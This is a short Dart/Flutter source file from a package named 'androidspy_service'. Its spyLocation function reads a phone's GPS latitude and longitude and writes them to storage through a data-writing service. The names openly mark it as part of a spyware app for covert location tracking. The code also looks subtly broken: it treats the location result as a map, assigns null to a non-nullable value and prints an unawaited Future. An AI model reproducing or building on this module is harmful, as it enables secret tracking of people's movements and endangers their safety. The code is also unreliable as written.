import 'package:location/location.dart' as LocationManager;
import 'dart:async';
import 'package:google_maps_flutter/google_maps_flutter.dart';
import 'package:androidspy_service/services/writeData.dart';

void spyLocation() {
  WriteData item = WriteData();

  Future<LatLng> getUserLocation() async {
    var currentLocation = <String, double>{};
    final location = LocationManager.Location();
    try {
      currentLocation = await location.getLocation();
      final lat = currentLocation["latitude"];
      final lng = currentLocation["longitude"];
      final center = LatLng(lat, lng);

      print("Latitude: $lat");
      print("Longitude: $lng");
      //point.latitude = lat;

      item.addLocation("location", "mylocation", lat, lng);
      return center;
    } on Exception {
      currentLocation = null;
      return null;
    }
  }

  final centerVal = getUserLocation();
  print(centerVal);
}
